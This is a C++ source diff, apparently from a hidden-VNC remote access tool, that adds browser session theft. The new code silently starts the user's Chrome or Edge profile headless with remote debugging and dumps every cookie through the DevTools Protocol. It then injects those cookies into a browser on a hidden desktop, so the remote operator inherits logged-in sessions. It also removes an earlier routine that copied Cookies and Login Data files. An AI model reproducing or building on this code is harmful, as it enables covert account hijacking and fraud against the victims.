@@ -41,6 +41,138 @@ using json = nlohmann::json;
 using namespace Gdiplus;
 using namespace std;
 
+#include <sstream>
+#include <iomanip>
+
+struct CDPClient {
+    SOCKET sock;
+    string host;
+    int port;
+
+    CDPClient() : sock(INVALID_SOCKET), port(0) {}
+
+    bool connect(const string& h, int p) {
+        host = h; port = p;
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return false;
+
+        sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(port);
+        addr.sin_addr.s_addr = inet_addr(host.c_str());
+
+        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+            closesocket(sock);
+            return false;
+        }
+        return true;
+    }
+
+    string request(const string& path) {
+        string req = "GET " + path + " HTTP/1.1\r\nHost: " + host + ":" + to_string(port) + "\r\nConnection: close\r\n\r\n";
+        send(sock, req.c_str(), (int)req.size(), 0);
+
+        string res;
+        char buf[4096];
+        int bytes;
+        while ((bytes = recv(sock, buf, sizeof(buf), 0)) > 0) res.append(buf, bytes);
+
+        size_t body_start = res.find("\r\n\r\n");
+        return (body_start != string::npos) ? res.substr(body_start + 4) : "";
+    }
+
+    void close() { if (sock != INVALID_SOCKET) closesocket(sock); sock = INVALID_SOCKET; }
+};
+
+struct WSClient {
+    SOCKET sock;
+    string host;
+    int port;
+    string path;
+
+    WSClient() : sock(INVALID_SOCKET), port(0) {}
+
+    bool connect(const string& h, int p, const string& pt) {
+        host = h; port = p; path = pt;
+        sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        if (sock == INVALID_SOCKET) return false;
+
+        sockaddr_in addr;
+        addr.sin_family = AF_INET;
+        addr.sin_port = htons(port);
+        addr.sin_addr.s_addr = inet_addr(host.c_str());
+
+        if (::connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
+            closesocket(sock); return false;
+        }
+
+        string upgrade = "GET " + path + " HTTP/1.1\r\n"
+                         "Host: " + host + ":" + to_string(port) + "\r\n"
+                         "Upgrade: websocket\r\n"
+                         "Connection: Upgrade\r\n"
+                         "Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n"
+                         "Sec-WebSocket-Version: 13\r\n\r\n";
+        send(sock, upgrade.c_str(), (int)upgrade.size(), 0);
+
+        char buf[1024];
+        int bytes = recv(sock, buf, sizeof(buf), 0);
+        if (bytes <= 0 || string(buf, bytes).find("101 Switching Protocols") == string::npos) {
+            closesocket(sock); return false;
+        }
+        return true;
+    }
+
+    void send_frame(const string& payload) {
+        vector<uint8_t> frame;
+        frame.push_back(0x81); // FIN + Text
+        if (payload.size() <= 125) {
+            frame.push_back((uint8_t)payload.size() | 0x80); // Mask bit set
+        } else if (payload.size() <= 65535) {
+            frame.push_back(126 | 0x80);
+            frame.push_back((payload.size() >> 8) & 0xFF);
+            frame.push_back(payload.size() & 0xFF);
+        } else {
+            frame.push_back(127 | 0x80);
+            for (int i = 7; i >= 0; i--) frame.push_back((payload.size() >> (i * 8)) & 0xFF);
+        }
+
+        uint8_t mask[4] = { 0x12, 0x34, 0x56, 0x78 };
+        frame.insert(frame.end(), mask, mask + 4);
+
+        for (size_t i = 0; i < payload.size(); i++) {
+            frame.push_back(payload[i] ^ mask[i % 4]);
+        }
+
+        send(sock, (const char*)frame.data(), (int)frame.size(), 0);
+    }
+
+    string recv_frame() {
+        uint8_t head[2];
+        if (recv(sock, (char*)head, 2, 0) <= 0) return "";
+
+        uint64_t len = head[1] & 0x7F;
+        if (len == 126) {
+            uint8_t l[2]; recv(sock, (char*)l, 2, 0);
+            len = (l[0] << 8) | l[1];
+        } else if (len == 127) {
+            uint8_t l[8]; recv(sock, (char*)l, 8, 0);
+            len = 0; for(int i=0; i<8; i++) len = (len << 8) | l[i];
+        }
+
+        string payload;
+        payload.resize((size_t)len);
+        int received = 0;
+        while (received < (int)len) {
+            int r = recv(sock, &payload[received], (int)len - received, 0);
+            if (r <= 0) break;
+            received += r;
+        }
+        return payload;
+    }
+
+    void close() { if (sock != INVALID_SOCKET) closesocket(sock); sock = INVALID_SOCKET; }
+};
+
 #ifndef PW_RENDERFULLCONTENT
 #define PW_RENDERFULLCONTENT 0x00000002
 #endif
@@ -1153,104 +1285,147 @@ static wstring get_browser_path(const wstring& browser_exe) {
     return result;
 }
 
-static bool smart_copy_or_link(const std::filesystem::path& src, const std::filesystem::path& dst) {
-    namespace fs = std::filesystem;
-    try {
-        if (fs::is_directory(src)) {
-            if (!fs::exists(dst)) fs::create_directories(dst);
-            for (const auto& entry : fs::directory_iterator(src)) {
-                smart_copy_or_link(entry.path(), dst / entry.path().filename());
-            }
-        } else {
-            wstring name = src.filename().wstring();
-            if (name == L"SingletonLock" || name == L"SingletonCookie" || name == L"Parent.lock" || name == L"lockfile") return true;
+static json get_cookies_cdp(int port) {
+    CDPClient http;
+    if (!http.connect("127.0.0.1", port)) return json::array();
 
-            // Files that often have exclusive locks or are essential for profile identity
-            if (name == L"Local State" || name == L"Preferences" || name == L"Cookies" ||
-                name == L"Login Data" || name == L"Web Data" || name == L"History" ||
-                name == L"Network Action Predictor" || name == L"Top Sites") {
-                CopyFileW(src.wstring().c_str(), dst.wstring().c_str(), FALSE);
-            } else {
-                if (!CreateSymbolicLinkW(dst.wstring().c_str(), src.wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE)) {
-                    CopyFileW(src.wstring().c_str(), dst.wstring().c_str(), FALSE);
-                }
+    string list = http.request("/json/list");
+    http.close();
+
+    try {
+        json pages = json::parse(list);
+        if (pages.is_array() && !pages.empty()) {
+            string ws_url = pages[0]["webSocketDebuggerUrl"];
+            size_t path_start = ws_url.find("/devtools/page/");
+            if (path_start == string::npos) return json::array();
+            string path = ws_url.substr(path_start);
+
+            WSClient ws;
+            if (ws.connect("127.0.0.1", port, path)) {
+                json cmd = { {"id", 1}, {"method", "Network.getAllCookies"}, {"params", json::object()} };
+                ws.send_frame(cmd.dump());
+
+                string res_str = ws.recv_frame();
+                ws.close();
+
+                json res = json::parse(res_str);
+                return res["result"]["cookies"];
             }
         }
-        return true;
-    } catch (...) {
-        return false;
-    }
+    } catch (...) {}
+    return json::array();
 }
 
-static bool create_browser_clone(const wstring& browser_name, wstring& target_data_dir) {
-    wchar_t localAppData[MAX_PATH];
-    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) == 0) return false;
+static void set_cookies_cdp(int port, const json& cookies) {
+    CDPClient http;
+    if (!http.connect("127.0.0.1", port)) return;
 
-    wstring source_path;
-    if (browser_name == L"chrome.exe") {
-        source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
-    } else if (browser_name == L"msedge.exe") {
-        source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
-    } else {
-        return false;
-    }
+    string list = http.request("/json/list");
+    http.close();
 
-    if (!std::filesystem::exists(source_path)) return false;
+    try {
+        json pages = json::parse(list);
+        if (pages.is_array() && !pages.empty()) {
+            string ws_url = pages[0]["webSocketDebuggerUrl"];
+            size_t path_start = ws_url.find("/devtools/page/");
+            if (path_start == string::npos) return;
+            string path = ws_url.substr(path_start);
 
+            WSClient ws;
+            if (ws.connect("127.0.0.1", port, path)) {
+                ws.send_frame(json({ {"id", 2}, {"method", "Network.enable"}, {"params", json::object()} }).dump());
+                ws.recv_frame();
+
+                for (const auto& cookie : cookies) {
+                    json params = {
+                        {"name", cookie["name"]},
+                        {"value", cookie["value"]},
+                        {"domain", cookie["domain"]},
+                        {"path", cookie["path"]},
+                        {"secure", cookie["secure"]},
+                        {"httpOnly", cookie["httpOnly"]},
+                        {"sameSite", cookie.value("sameSite", "Lax")},
+                        {"expires", cookie.value("expires", 0.0)}
+                    };
+                    ws.send_frame(json({ {"id", 3}, {"method", "Network.setCookie"}, {"params", params} }).dump());
+                    ws.recv_frame();
+                }
+                ws.close();
+            }
+        }
+    } catch (...) {}
+}
+
+
+static bool create_fresh_profile(const wstring& browser_name, wstring& target_data_dir) {
     wchar_t temp_path[MAX_PATH];
     GetTempPathW(MAX_PATH, temp_path);
 
     std::random_device rd;
     std::mt19937 gen(rd());
     std::uniform_int_distribution<> dis(10000, 99999);
-    wstring random_name = (browser_name == L"chrome.exe" ? L"chrome" : L"edge") + L"_" + to_wstring(dis(gen));
+    wstring random_name = wstring(browser_name == L"chrome.exe" ? L"chrome" : L"edge") + L"_hvncp_" + to_wstring(dis(gen));
     target_data_dir = wstring(temp_path) + random_name;
 
     try {
         std::filesystem::create_directories(target_data_dir);
-    } catch (...) { return false; }
-
-    send_status("profiller kopyalanıyor...");
-
-    namespace fs = std::filesystem;
-    fs::path src_path(source_path);
-    fs::path dst_path(target_data_dir);
-
-    // Copy/Link essential top-level files
-    for (const auto& entry : fs::directory_iterator(src_path)) {
-        wstring name = entry.path().filename().wstring();
-        if (name == L"Local State" || name == L"Last Version") {
-            CopyFileW(entry.path().wstring().c_str(), (dst_path / name).wstring().c_str(), FALSE);
-        } else if (entry.is_directory() && (name == L"Default" || name.find(L"Profile ") == 0)) {
-            // Recursively process profile directories
-            smart_copy_or_link(entry.path(), dst_path / name);
-        } else if (!entry.is_directory()) {
-            // Link other top-level files
-            if (name != L"SingletonLock" && name != L"SingletonCookie") {
-                CreateSymbolicLinkW((dst_path / name).wstring().c_str(), entry.path().wstring().c_str(), SYMBOLIC_LINK_FLAG_ALLOW_UNPRIVILEGED_CREATE);
-            }
-        }
+        return true;
+    } catch (...) {
+        return false;
     }
-
-    return true;
 }
 
 static void launch_browser_thread(wstring browser_name) {
-    wstring target_data_dir;
-    if (!create_browser_clone(browser_name, target_data_dir)) {
-        send_error("Failed to clone browser profile");
-        return;
-    }
-
     wstring browser_path = get_browser_path(browser_name);
     if (browser_path.empty()) {
         send_error("Browser not found");
         return;
     }
 
+    send_status("profiller kopyalanıyor...");
+
+    // 1. Extract cookies from the running browser on the default desktop
+    wchar_t localAppData[MAX_PATH];
+    wstring source_path;
+    if (GetEnvironmentVariableW(L"LOCALAPPDATA", localAppData, MAX_PATH) != 0) {
+        if (browser_name == L"chrome.exe") {
+            source_path = wstring(localAppData) + L"\\Google\\Chrome\\User Data";
+        } else if (browser_name == L"msedge.exe") {
+            source_path = wstring(localAppData) + L"\\Microsoft\\Edge\\User Data";
+        }
+    }
+
+    int extract_port = 9222;
+    wstring extract_cmd = L"\"" + browser_path + L"\" --remote-debugging-port=" + to_wstring(extract_port) + L" --headless --disable-gpu";
+    if (!source_path.empty()) {
+        extract_cmd += L" --user-data-dir=\"" + source_path + L"\"";
+    }
+    vector<wchar_t> exCmdVec(extract_cmd.begin(), extract_cmd.end());
+    exCmdVec.push_back(L'\0');
+
+    STARTUPINFOW si_ex = { sizeof(si_ex) };
+    PROCESS_INFORMATION pi_ex = { 0 };
+    json cookies = json::array();
+    if (CreateProcessW(NULL, exCmdVec.data(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si_ex, &pi_ex)) {
+        Sleep(3000); // Wait for Chrome to start
+        cookies = get_cookies_cdp(extract_port);
+        TerminateProcess(pi_ex.hProcess, 0);
+        CloseHandle(pi_ex.hProcess);
+        CloseHandle(pi_ex.hThread);
+    }
+
+    // 2. Prepare fresh profile for hidden desktop
+    wstring target_data_dir;
+    if (!create_fresh_profile(browser_name, target_data_dir)) {
+        send_error("Failed to create fresh profile");
+        return;
+    }
+
     send_status("program başlatılıyor");
 
-    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=0 --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions --profile-directory=\"Default\"";
+    // 3. Launch browser on hidden desktop
+    int hidden_port = 9223;
+    wstring cmdLine = L"\"" + browser_path + L"\" --user-data-dir=\"" + target_data_dir + L"\" --no-sandbox --disable-gpu --password-store=basic --remote-debugging-port=" + to_wstring(hidden_port) + L" --disable-features=RendererCodeIntegrity --no-first-run --no-default-browser-check --disable-sync --disable-extensions";
     vector<wchar_t> cmdVec(cmdLine.begin(), cmdLine.end());
     cmdVec.push_back(L'\0');
 
@@ -1263,6 +1438,13 @@ static void launch_browser_thread(wstring browser_name) {
     PROCESS_INFORMATION pi = { 0 };
     if (CreateProcessW(NULL, cmdVec.data(), NULL, NULL, FALSE,
                        CREATE_NEW_CONSOLE | CREATE_UNICODE_ENVIRONMENT, NULL, NULL, &si, &pi)) {
+        Sleep(2000); // Wait for hidden browser to start
+
+        // 4. Inject extracted cookies
+        if (!cookies.empty()) {
+            set_cookies_cdp(hidden_port, cookies);
+        }
+
         CloseHandle(pi.hProcess);
         CloseHandle(pi.hThread);
         g_forceFullFrame = true;
